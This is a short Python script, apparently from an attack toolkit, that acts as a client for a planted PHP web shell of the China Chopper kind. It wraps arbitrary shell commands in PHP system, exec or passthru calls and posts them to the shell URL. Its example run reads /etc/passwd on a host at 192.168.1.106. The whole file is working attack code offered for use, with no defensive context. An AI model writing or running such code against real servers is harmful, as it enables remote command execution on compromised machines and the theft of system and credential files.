#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import json
import sys
sys.path.append('..')
from configuration import configuration as config

class ExecuteFailException(Exception):
    '''execute fail'''

def execute_command(shell, password, command, php_function='system'):
    if "exec" == php_function:
        data = {password: "$output='';exec('"+command+"',$output);foreach($output as $str){echo $str;}"}
    elif "passthru" == php_function:
        data = {password: "passthru('"+command+"');"}
    else:
        data = {password: "system('"+command+"');"}
    try:
        res = requests.post(shell, data=data, headers=config.headers, timeout=2)
        if res.status_code == 200:
            return res.text
        else:
            raise ExecuteFailException
    except:
        raise ExecuteFailException


if __name__ == '__main__':
    print(execute_command("http://192.168.1.106/shell.php","caidao","cat /etc/passwd","exec"))

